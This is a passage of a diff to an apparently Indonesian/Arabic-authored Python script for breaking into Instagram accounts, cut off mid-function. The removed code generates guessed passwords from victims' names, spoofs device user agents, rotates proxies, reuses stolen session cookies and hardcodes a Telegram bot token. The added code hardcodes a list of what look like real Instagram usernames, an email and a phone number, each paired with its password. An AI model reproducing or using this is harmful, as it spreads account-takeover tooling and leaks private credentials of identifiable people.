@@ -1,776 +1,674 @@
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+import os
+import time
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# ========== ألوان ==========
+Z = '\033[1;31m'
+F = '\033[2;32m'
+C = "\033[1;97m"
+B = '\033[2;36m'
+Y = '\033[1;34m'
+S = '\033[1;37m'
+CYAN = "\033[1;36m"
 
-try:
-    import re, requests, json, random, time, urllib, uuid, hashlib, os, sys, base64
-    import urllib, hmac, string
-    import re
-    from rich.tree import Tree
-    from rich import print as printf
-    from rich.console import Console
-    from rich.panel import Panel as Pan
-    from datetime import datetime
-    from bs4 import BeautifulSoup as bsp
-    from rich.panel import Panel
-    from rich import print as prints
-    from rich.table import Table
-    from rich.columns import Columns
-    from concurrent.futures import ThreadPoolExecutor as executor
-except (ImportError, ModuleNotFoundError) as e:
-   __import__('os').system('clear') ; print(f'\n \x1b[0m[\x1b[1;91m!\x1b[0m] ModuleNotFoundError : \x1b[1;91m{str(e).title()}\n \x1b[0m[\x1b[1;91m!\x1b[0m] silahkan install module dengan ketik \x1b[0m( pip install \x1b[1;92m{str(e.name)} \x1b[0m)') ; time.sleep(3.1) ; sys.exit()
-token= '7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M'
-ID = '7327921791'
-Z2 = "[#000000]" # HITAM
-M2 = "[#FF0000]" # MERAH
-H2 = "[#00FF00]" # HIJAU
-Ha = "[#78FF00]" # HIJAU
-K2 = "[#FFFF00]" # KUNING
-B2 = "[#00C8FF]" # BIRU
-U2 = "[#AF00FF]" # UNGU
-N2 = "[#FF00FF]" # PINK
-O2 = "[#00FFFF]" # BIRU MUDA
-P2 = "[#FFFFFF]" # PUTIH
-J2 = "[#FF8F00]" # JINGGA
-A2 = "[#AAAAAA]" # ABU-ABU
-Na = "[#ff0033]" # PINK
+# ========== لوجو ==========vvnb
+def logo():
+    return f"""\033[1;92m
+           [ 𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 ✰ 𝐕4 𝚉𝚎𝚛𝚘 𝚃𝚛𝚊𝚌𝚎 ℝ~~𝔾 ︎☠︎︎]\n
+{C}  > 𝙼𝚢 𝙽𝚊𝚖𝚎 : {CYAN} 𖤍 𝚁𝚊𝚢𝚎𝚗 𖤍 
+"""
 
-M = '\x1b[1;91m' # MERAH
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-def remove_emojis(text):
-    # التعبير النمطي (Regular expression) لمطابقة الرموز التعبيرية
-    emoji_pattern = re.compile("[\U0001F600-\U0001F64F\U0001F300-\U0001F5FF\U0001F680-\U0001F6FF\U0001F700-\U0001F77F\U0001F780-\U0001F7FF\U0001F800-\U0001F8FF\U0001F900-\U0001F9FF\U0001FA00-\U0001FA6F\U0001FA70-\U0001FAFF\U00002702-\U000027B0\U000024C2-\U0001F251]+", flags=re.UNICODE)
-    return emoji_pattern.sub('', text)
-
-def kalender():
-	struct_time = time.localtime(time.time())
-	hari_indonesia = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"]
-	hari = hari_indonesia[struct_time.tm_wday]
-	tanggal = time.strftime("%d", struct_time)
-	bulan = time.strftime("%B", struct_time)
-	tahun = time.strftime("%Y", struct_time)
-	jam = time.strftime("%H:%M:%S", struct_time)
-	return hari, tanggal, bulan, tahun, jam
-
-hari, tanggal, bulan, tahun, jam = kalender()
-hari_save = f"{hari}-{tanggal}-{bulan}-{tahun}.txt"
-session = requests.Session()
-
-class Require:
-    def __init__(self):
-        self.info,self.ex = {}, {}
-
-    def data_graph(self, xxx):
-        data = {
-           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
-           '__d': 'www',
-           '__user': '0',
-           '__a':'1',
-           '__req': 'h',
-           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
-           'dpr': '2',
-           '__ccg': 'GOOD',
-           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
-           '__s': '',
-           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
-           '__dyn': '',
-           '__csr': '',
-           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
-           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
-           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
-           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
-           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
-           '__spin_b': 'trunk',
-           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
-           'fb_api_caller_class': 'RelayModern',
-           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
-           'server_timestamps': 'true',
-           'doc_id': '6888165191230459'
-        }
-        return(data)
-
-    def headers_graph(self, xxx):
-        headers = {
-           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
-           'x-ig-app-id': '1217981644879628',
-           'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',
-           'content-type': 'application/x-www-form-urlencoded',
-           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
-           'accept': '*/*',
-        }
-        return(headers)
-
-    def ClientId(self, xxx):
-        try:
-            Client = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
-            return(Client)
-        except AttributeError:return('')
-        except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)
-
-    def AccountId(self, xxx):
-        try:
-            Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
-            return(Userid)
-        except AttributeError:return('')
-        except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)
-
-    def GetRespon(self, url, cok):
-        try:
-            req = requests.get(url, cookies = {'cookie': cok}).text
-            return(Client)
-        except requests.exceptions.ConnectionError: time.sleep(5); self.GetRespon(url, cok)
-
-    def Password(self, fullname):
-        self.one, self.two = [], []
-        for nama in fullname.split(' '):
-            nama = nama.lower()
-            if len(nama) <3: continue
-            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama+'123456');self.one.append(nama+nama);self.one.append(nama.capitalize()+'123');self.one.append(nama.capitalize()+'1234');self.one.append(nama.capitalize()+'12345');self.one.append(nama.capitalize()+'123456')
-            else:self.one.append(nama);self.one.append(fullname);self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama+'123456');self.one.append(nama+nama);self.one.append(nama.capitalize()+'123');self.one.append(nama.capitalize()+'1234');self.one.append(nama.capitalize()+'12345');self.one.append(nama.capitalize()+'123456')
-        return(self.one)
-
-
-    def Signature(self, data, body='SIGNATURE'):
-        return 'signed_body={}.{}&ig_sig_key_version=4'.format(body, urllib.parse.quote_plus(data))
-
-    def DeviceId(self):
-        return 'android-%s'%(self.uuid_(True)[:16])
-
-    def uuid_(self, abcd=None, zd=None):
-        if zd is not None:
-           m = hashlib.md5()
-           m.update(zd.encode('utf-8'))
-           i = uuid.UUID(m.hexdigest())
-        else:
-           i = uuid.uuid4()
-           if abcd: return str(i.hex)
-        return str(i)
-
-    def adid(self, username):
-        sha2 = hashlib.sha256()
-        sha2.update(username.encode('utf-8'))
-        abcd = sha2.hexdigest()
-        return self.uuid_(False, abcd)
-
-    def guid(self):
-        return self.uuid_(False)
-
-    def poid(self):
-        return self.uuid_(False, self.guid())
-
-    def socks(self, item = []):
-        if os.path.isfile('data/termux/internal/proxies.txt') is True:
-           return(open('data/termux/internal/proxies.txt','r').read().splitlines())
-        else:
-           try:
-               resp = requests.get('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt')
-               for i in resp.text.splitlines():
-                   if i.isdigit:
-                      if i not in item:
-                         item.append(i)
-                         open('data/termux/internal/proxies.txt','a').write(f'{i}\n')
-               return item
-           except requests.exceptions.ConnectionError as e:
-               time.sleep(5) ; self.socks()
-
-    def vers(self):
-        igv = ("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
-        igve = igv.split(",")
-        versi = random.choice(igve)
-        return versi
-        		
-    def UserAgent(self):
-        rr = random.randint
-        rc = random.choice    
-        andro = rc(['23/6.0.1','24/7.0','22/5.1.1','26/8.0.0','17/4.2.2','19/4.4.2','25/7.1.1','21/5.0','28/9']) 
-        dpis = rc(['640dpi','320dpi','480dpi','560dpi','240dpi']) 
-        pxl = rc(['1440x2560','720x1280','1080x1920','1440x2792','480x800','1080x2076','1440x2768','720x1384','1080x2094']) 
-        basa = rc(['pt_PT','ru_RU','fr_CA','uk_UA','de_DE','hu_HU','ru_UA','en_US']) 
-        basi = rc(['qcom','samsungexynos8890']) 
-        kode = rc(['98288242','99640911','99640905','99640911','102221279','117539695','98288239','144612598','143631574','127049003','126223520','94080603','96794590','90841939']) 
-        igv = ("134.0.0.26.121,87.0.0.18.99,116.0.0.34.121,27.0.0.11.97,110.0.0.16.119,133.0.0.32.120,123.0.0.21.114,128.0.0.26.128,124.0.0.17.473,129.0.0.29.119,133.0.0.32.120,48.0.0.15.98,44.0.0.9.93,131.0.0.25.116,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,133.0.0.32.120,124.0.0.17.473,129.0.0.29.119,23.0.0.14.135,40.0.0.14.95,80.0.0.14.110,128.0.0.26.128,20.0.0.29.75,111.1.0.25.152,80.0.0.14.110,125.0.0.20.126,111.1.0.25.152,132.0.0.26.134,97.0.0.32.119,24.0.0.12.201,22.0.0.17.68,93.1.0.19.102,54.0.0.26.138,43.0.0.29.150,120.0.0.25.141,122.0.0.29.238,131.0.0.25.116,127.0.0.30.121") 
-        igve = igv.split(",")     
-        versi = rc(igve)        
-        kntlgoreng = rc(["trlte"]) 
-        redmis = rc(["SM-N910F"]) 
-        return(f'''Instagram {versi} Android ({andro}; {dpis}; {pxl}; samsung; {redmis}; {kntlgoreng}; {basi}; {basa}; {kode})''')
-        
+# ========== الحسابات ==========
+accounts = [
     
-        
-    def UaGege(self):
-        dpis = random.choice(['320dpi, 640dpi, 213dpi, 480dpi, 420dpi, 240dpi, 280dpi, 160dpi, 560dpi, 540dpi, 272dpi, 360dpi, 720dpi, 270dpi, 450dpi, 600dpi, 279dpi, 210dpi, 180dpi, 510dpi, 300dpi, 454dpi, 314dpi, 288dpi, 401dpi, 153dpi, 267dpi, 345dpi, 493dpi, 340dpi, 604dpi, 465dpi, 680dpi, 256dpi, 290dpi, 432dpi, 273dpi, 120dpi, 200dpi, 367dpi, 419dpi, 306dpi, 303dpi, 411dpi, 195dpi, 518dpi, 230dpi, 384dpi, 315dpi, 293dpi, 274dpi, 235dpi'])
-        pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
-        basa = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
-        andro = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
-        xiaomi = random.choice([
-            'M2004J19C',
-            'Redmi Note 9S',
-            'M2101K7AG',
-            'cepheus',
-            'Redmi Note 9 Pro',
-            'Redmi Note 8 Pro',
-            '220333QL',
-            'M2101K7BG',
-            'M2006C3MG',
-            'M2012K11G',
-            '2201117SG',
-            'M2010J19SL',
-            'M2006C3MG',
-            '2201117TY',
-            'M2003J15SC',
-            '2201117SY',
-            '23021RAAEG',
-            'M2101K7BI'])
-        mod = random.choice([
-            'galahad',
-            'curtana',
-            'sunny',
-            'cepheus',
-            'joyeuse',
-            'begonia',
-            'wind',
-            'secret',
-            'angelica',
-            'raphael',
-            'vili',
-            'taoyao',
-            'ginkgo',
-            'renoir',
-            'haydn',
-            'tapas',
-            'fleur',
-            'merlinnfc',
-            'spesn',
-            'pomelo',
-            'miel'])
-        com = random.choice([
-            'qcom',
-            'mt6833',
-            'mt6765',
-            'mt8168',
-            'mt6781',
-            'mt6765',
-            'mt6768',
-            'mt6785'])
-        versi = self.vers()
-        return(f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/Redmi; {xiaomi}; {mod}; {com}; {basa})")
-        
-    def getUserAgentt(self):
-        basa = random.choice([
-            'ru_RU',
-            'en_GB',
-            'uk_UA',
-            'en_US',
-            'de_DE',
-            'it_IT',
-            'ru_UA',
-            'ar_AE',
-            'tr_TR',
-            'lv_LV',
-            'th_TH',
-            'fr_FR',
-            'sr_RS',
-            'hu_HU',
-            'bg_BG',
-            'pt_PT',
-            'pt_BR',
-            'es_ES',
-            'en_IE',
-            'nl_NL',
-            'fr_CH',
-            'de_CH',
-            'es_US',
-            'fr_CA',
-            'ru_BY',
-            'en_PH',
-            'en_AU',
-            'hy_AM',
-            'fa_IR',
-            'de_AT',
-            'cs_CZ',
-            'ru_KZ',
-            'en_CA',
-            'fr_BE',
-            'az_AZ',
-            'en_NZ',
-            'en_ZA',
-            'es_LA',
-            'ru_KG',
-            'pl_PL',
-            'es_MX',
-            'ro_RO',
-            'el_GR',
-            'iw_IL',
-            'in_ID',
-            'ga_IE',
-            'en_IN',
-            'ar_SA',
-            'ka_GE',
-            'es_CO',
-            'es_SV',
-            'hr_HR',
-            'ar_JO',
-            'es_PE',
-            'it_SM',
-            'ar_AR',
-            'en_SE',
-            'nb_NO',
-            'sk_SK',
-            'bs_BA',
-            'nl_BE',
-            'uz_UZ',
-            'sl_SI',
-            'es_CL'])
-        com = random.choice([
-            'qcom',
-            'mt6833',
-            'mt6765',
-            'mt8168',
-            'mt6781',
-            'mt6765',
-            'mt6768',
-            'mt6785'])
-        versi = self.vers()
-        dpis = random.choice([
-            '320dpi',
-            '640dpi',
-            '213dpi',
-            '480dpi',
-            '420dpi',
-            '240dpi',
-            '280dpi',
-            '160dpi',
-            '560dpi',
-            '540dpi',
-            '272dpi',
-            '360dpi',
-            '720dpi',
-            '270dpi',
-            '450dpi',
-            '600dpi',
-            '279dpi',
-            '210dpi',
-            '180dpi',
-            '510dpi',
-            '300dpi',
-            '454dpi',
-            '314dpi',
-            '288dpi',
-            '401dpi',
-            '153dpi',
-            '267dpi',
-            '345dpi',
-            '493dpi',
-            '340dpi',
-            '604dpi',
-            '465dpi',
-            '680dpi',
-            '256dpi',
-            '290dpi',
-            '432dpi',
-            '273dpi',
-            '120dpi',
-            '200dpi',
-            '367dpi',
-            '419dpi',
-            '306dpi',
-            '303dpi',
-            '411dpi',
-            '195dpi',
-            '518dpi',
-            '230dpi',
-            '384dpi',
-            '315dpi',
-            '293dpi',
-            '274dpi',
-            '235dpi'])
-        pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
-        kode = random.choice(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269'])
-        build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
-        return(f'''Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (27/8.1.0; {dpis}; {pxl}; vivo; vivo 1820; 1820; {com}; {basa}; {kode})''')
-        
-    def Convert_cooks(self, item):
-        try:
-            sesid = 'sessionid=' + re.findall('sessionid=(\d+)', str(item))[0]
-            ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\d+)', str(item))[0]
-            csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
-            donez = '%s; %s; %s; ig_nrcb=1; dpr=2;'%(csrft, ds_id, sesid)
-        except Exception as e:
-            donez = 'cookies tidak di temukan, error saat convert'
-        return donez
+
+    "joujou_wejden1999|wejden123456",
+    "911_____maeb|maeb123",
+    "nadhir13282|nadhir12345",
+
+    "frajchaima99@gmail.com|isra12345",
+    "theyluv_sayda|sayda123456b",
+
+
+    "rahmaben.halima|rahma123456",
+    "ayoub_bouzuita|BR9Zz!",
+    "ramijbnouni|Rami1234",
+    "garbaayakine|yakine1234",
+    "+21628075915|Rahma123",
     
-    def GetPhone(self, cookie, status = {}):
-        try:
-            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies = {'cookie':cookie}).text
-            head = self.headers_graph(resp)
-            head.update({
-               'Host': 'accountscenter.instagram.com',
